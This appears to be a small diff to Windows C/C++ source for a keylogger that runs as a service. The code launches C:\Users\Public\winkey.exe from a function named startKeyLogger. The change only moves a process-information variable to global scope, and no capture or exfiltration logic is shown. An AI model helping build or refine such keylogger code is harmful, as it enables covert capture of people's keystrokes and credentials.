@@ -20,6 +20,7 @@ LPSTR wszCommand = "C:\\Users\\Public\\winkey.exe";
 SERVICE_STATUS        g_ServiceStatus = { 0 };
 SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
 HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;
+PROCESS_INFORMATION     pi;
 
 VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
 VOID WINAPI ServiceCtrlHandler(DWORD);
@@ -215,7 +216,6 @@ int startKeyLogger()
     HANDLE token = nullptr;
     HANDLE newtoken = nullptr;
     BOOL ret = false;
-    PROCESS_INFORMATION     pi;
     STARTUPINFO si;
 
     ZeroMemory(&si, sizeof(si));
